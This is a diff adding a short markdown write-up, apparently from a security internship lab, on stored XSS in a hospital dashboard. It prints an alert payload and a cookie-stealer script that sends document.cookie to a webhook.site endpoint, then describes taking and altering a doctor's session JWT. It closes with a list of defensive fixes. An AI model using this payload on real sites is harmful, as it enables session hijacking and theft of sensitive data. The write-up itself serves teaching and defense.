@@ -1,0 +1,57 @@
+# XSS – MedCare Dashboard
+
+##  What I Did
+I tested for **Stored Cross-Site Scripting (XSS)** on a custom hospital dashboard. Injected JavaScript inside the patient message input, and it got executed across all user dashboards (Stored XSS).
+
+---
+
+##  Tools Used
+- vulnerable site
+- JavaScript payloads
+- webhook.site (for capturing cookies, optional)
+- DevTools (Application tab)
+
+---
+
+## Screenshot – Stored XSS Triggered
+![xss](../images/XSS.jpg)
+
+---
+
+##  Steps
+
+### 1. Injected the payload in “Patient Message”:
+```html
+<script>alert(document.cookie)</script>
+
+### 2. Used Cookie Stealer
+
+<script>fetch("https://webhook.site/YOUR-ID?cookie=" + document.cookie)</script>
+This payload secretly sent the cookies of the doctor user to my webhook endpoint.
+
+3. Checked DevTools → Application → Cookies
+Grabbed the session JWT from the browser
+
+Used jwt.io to decode the token and modify if needed
+
+## XSS Types Explored During Internship
+
+### 1.Reflected-Payload executes immediately 
+### 2.Stored-Payload is saved in DB, affects all users
+### 3.DOM-Based	Executed via JS logic, not saved on server
+
+## Fixes from Internship Notes
+### 1.HttpOnly Cookie
+Prevent JavaScript from reading cookies
+
+### 2.Whitelist Inputs
+Only allow valid characters, block <script> and JS tags
+
+### 3.Use Proper Escaping
+Encode HTML special chars before rendering
+
+### 4.Enable SameSite + Secure Flags
+Prevents cross-origin and insecure transfers
+
+### 5.JWT Security
+Use strong signature algo (RS256), never trust user-controlled JWTs blindly
